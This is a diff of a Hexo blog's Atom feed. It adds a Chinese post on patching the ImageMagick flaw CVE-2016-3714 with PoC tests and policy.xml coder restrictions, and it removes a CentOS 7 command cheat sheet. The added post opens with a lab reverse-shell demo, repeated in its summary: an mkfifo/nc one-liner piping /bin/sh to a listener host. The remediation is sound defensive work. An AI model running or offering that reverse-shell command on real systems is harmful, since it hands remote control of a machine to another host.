@@ -4,7 +4,7 @@
   <subtitle><![CDATA[Live with love]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2016-05-09T09:59:32.000Z</updated>
+  <updated>2016-05-11T00:34:35.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -13,6 +13,119 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[修复ImageMagic漏洞(CVE-2016-3714)]]></title>
+    <link href="http://yoursite.com/2016/05/10/%E4%BF%AE%E5%A4%8DImageMagic%E6%BC%8F%E6%B4%9E-CVE-2016-3714/"/>
+    <id>http://yoursite.com/2016/05/10/修复ImageMagic漏洞-CVE-2016-3714/</id>
+    <published>2016-05-10T10:29:23.000Z</published>
+    <updated>2016-05-11T00:34:35.000Z</updated>
+    <content type="html"><![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="反弹 Shell (Reverse Shell) 实验"></a>反弹 Shell (Reverse Shell) 实验</h3><p>将node1的 shell 反弹给 node3</p>
+<p>node3监听2333端口:</p>
+<pre><code>[root@node3 ~]# nc -lvv 2333
+Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
+sh-4.1# hostname
+hostname
+node1
+</code></pre><p>node1 nc反弹:</p>
+<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
+rm: cannot remove `/tmp/f&apos;: No such file or directory
+</code></pre><a id="more"></a>
+<h3 id="u4FEE_u590D_u8FC7_u7A0B_3A"><a href="#u4FEE_u590D_u8FC7_u7A0B_3A" class="headerlink" title="修复过程:"></a>修复过程:</h3><p>先到<a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">这里</a>下载检测脚本:</p>
+<p>检测脚本的使用方法:</p>
+<pre><code>git clone https://github.com/ImageTragick/PoCs.git
+cd PoCs
+./test.sh
+</code></pre><p>开始检测</p>
+<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
+testing read
+UNSAFE
+
+testing delete
+UNSAFE
+
+testing http with local port: 18781
+SAFE
+
+testing http with nonce: apPod0Vg
+SAFE
+
+testing rce1
+UNSAFE
+
+testing rce2
+SAFE
+
+testing MSL
+UNSAFE
+</code></pre><p>可以看到, 是 UNSAFE 的</p>
+<p>修复方案:</p>
+<p>1.在上传图片时需要通过文件内容来判断用户上传的是否为真实图片类型.(这个需要告知开发人员)</p>
+<p>2.使用策略配置文件来禁用ImageMagick的有风险的编码器</p>
+<p>对于ImageMagick全局策略配置文件在/etc/ImageMagick下对policy.xml最后一行进行增加下列配置:</p>
+<pre><code>vi /etc/ImageMagick/policy.xml
+
+&lt;policymap&gt;
+
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;
+
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;
+
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;
+
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;
+
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;
+
+&lt;/policymap&gt;
+</code></pre><p>再次运行检测脚本:</p>
+<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
+testing read
+SAFE
+
+testing delete
+SAFE
+
+testing http with local port: 47221
+SAFE
+
+testing http with nonce: hMtPw5DB
+SAFE
+
+testing rce1
+SAFE
+
+testing rce2
+SAFE
+
+testing MSL
+SAFE
+</code></pre><p>参考:</p>
+<p><a href="http://bobao.360.cn/learning/detail/2862.html" target="_blank" rel="external">CVE-2016-3714ImageMagick远程执行漏洞修复建议</a></p>
+<p><a href="http://le4f.net/post/post/reverse-shell-during-the-penetration-test" target="_blank" rel="external">渗透测试:反弹与转发小结 - Reverse Shell During the Penetration Test</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="反弹 Shell (Reverse Shell) 实验"></a>反弹 Shell (Reverse Shell) 实验</h3><p>将node1的 shell 反弹给 node3</p>
+<p>node3监听2333端口:</p>
+<pre><code>[root@node3 ~]# nc -lvv 2333
+Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
+sh-4.1# hostname
+hostname
+node1
+</code></pre><p>node1 nc反弹:</p>
+<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
+rm: cannot remove `/tmp/f&apos;: No such file or directory
+</code></pre>]]>
+    
+    </summary>
+    
+      <category term="Reverse Shell" scheme="http://yoursite.com/tags/Reverse-Shell/"/>
+    
+      <category term="security" scheme="http://yoursite.com/tags/security/"/>
+    
+      <category term="it" scheme="http://yoursite.com/categories/it/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[svn 配置http 服务]]></title>
@@ -1462,50 +1575,6 @@ Or, if you don&apos;t want/need launchctl, you can just run:
     </summary>
     
       <category term="rsync" scheme="http://yoursite.com/tags/rsync/"/>
-    
-      <category term="it" scheme="http://yoursite.com/categories/it/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[centos7常用命令]]></title>
-    <link href="http://yoursite.com/2016/03/25/centos7%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
-    <id>http://yoursite.com/2016/03/25/centos7常用命令/</id>
-    <published>2016-03-25T07:30:43.000Z</published>
-    <updated>2016-03-31T03:25:12.000Z</updated>
-    <content type="html"><![CDATA[<p>其实这些东西大部分 ansible 都能做</p>
-<h3 id="systemd__u76F8_u5173"><a href="#systemd__u76F8_u5173" class="headerlink" title="systemd 相关"></a>systemd 相关</h3><p>设置开机自启动命令</p>
-<pre><code>启动nginx服务
-systemctl start nginx.service
-设置开机自启动
-systemctl enable nginx.service
-停止开机自启动
-systemctl disable nginx.service
-查看服务当前状态
-systemctl status nginx.service
-重新启动服务
-systemctl restart nginx.service
-查看所有已启动的服务
-systemctl list-units --type=service
-</code></pre><h3 id="u67E5_u770B_u7CFB_u7EDF_u7248_u672C"><a href="#u67E5_u770B_u7CFB_u7EDF_u7248_u672C" class="headerlink" title="查看系统版本"></a>查看系统版本</h3><pre><code>$ cat /etc/redhat-release
-CentOS Linux release 7.2.1511 (Core)
-</code></pre><h3 id="u9632_u706B_u5899"><a href="#u9632_u706B_u5899" class="headerlink" title="防火墙"></a>防火墙</h3><p>客户端命令firewalld可以用来修改firewalld的永久配置或者运行时配置。firewalld的配置文件保存在<code>/usr/lib/firewalld/</code> 和 <code>/etc/firewalld/</code>中，其中前者是默认的配置，请不要修改。可以在<code>/etc/firewalld/</code>中编辑自己的配置，firewalld优先使用<code>/etc/firewalld/</code>中的配置。</p>
-<p><a href="http://mlworks.cn/posts/Redhat7-Centos7-firewalld/" target="_blank" rel="external">Redhat 7与Centos 7中的防火墙Firewalld</a></p>
-<p><a href="https://argcv.com/articles/3167.c" target="_blank" rel="external">CentOS 7 下使用 iptables</a></p>
-<pre><code>service iptables save #保存设置
-iptables-save &gt; /etc/iptables.save  #导出设置
-iptables-restore /etc/iptables.save #导入设置
-
-原先的 iptables 脚本在K`/usr/libexec/iptables/iptables.init`
-可以拷贝用..
-cp /usr/libexec/iptables/iptables.init /etc/init.d/iptables
-</code></pre>]]></content>
-    <summary type="html">
-    <![CDATA[<p>其实这些东西大部分 ansible 都能做</p>
-<h3 id="systemd__u76F8_u5173"><a href="#systemd__u76F8_u5173" class="headerlink" title="systemd 相关"></a>systemd]]>
-    </summary>
-    
-      <category term="Centos 7" scheme="http://yoursite.com/tags/Centos-7/"/>
     
       <category term="it" scheme="http://yoursite.com/categories/it/"/>
     
